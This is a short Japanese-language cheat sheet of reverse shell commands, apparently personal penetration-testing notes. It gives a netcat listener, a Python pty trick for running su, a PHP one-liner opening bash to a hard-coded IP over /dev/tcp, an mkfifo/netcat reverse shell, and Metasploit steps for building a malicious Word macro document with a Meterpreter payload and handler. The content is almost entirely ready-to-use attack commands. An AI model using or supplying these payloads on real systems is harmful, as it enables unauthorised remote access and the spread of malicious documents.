# リバースシェル

## メモ

### listen

```shell
nc -lvp <port>
```

### リバースシェルで su を実行できるようにする魔法

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
su - <user>
```

## 言語別

### PHP

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.11.9/1234 0>&1'") ?>
```

### shell
```shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> > /tmp/f
```

### Office マクロ
```shell
msf6> set payload windows/meterpreter/reverse_tcp
msf6> use exploit/multi/fileformat/office_word_macro
set LHOST <ip>
set LPORT <port>
exploit
ls .msf4/local/msf.docm 
```

listen

```shell
msf6 > use multi/handler
set LHOST <ip>
set LPORT <port>
exploit
```
